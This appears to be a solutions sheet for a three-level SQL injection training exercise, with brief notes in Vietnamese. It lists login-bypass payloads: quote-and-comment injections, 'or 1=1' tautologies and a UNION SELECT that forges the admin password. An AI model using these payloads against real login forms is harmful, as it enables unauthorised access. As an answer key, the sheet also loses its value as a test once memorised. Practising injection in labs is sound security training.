# Solutions

**Level1**: Login as admin
- username: `admin'-- `, `admin'#`, `admin' or '1'='1`

**Level2**: Login as admin (dấu ngoặc kép)
- username: `admin"--`, `admin"#`, `admin" or "1"="1`

**Level3**: Login as admin (Dùng UNION để control password trả về)
- username: `x' UNION SELECT 'admin','admin' --` 
- password: `admin`
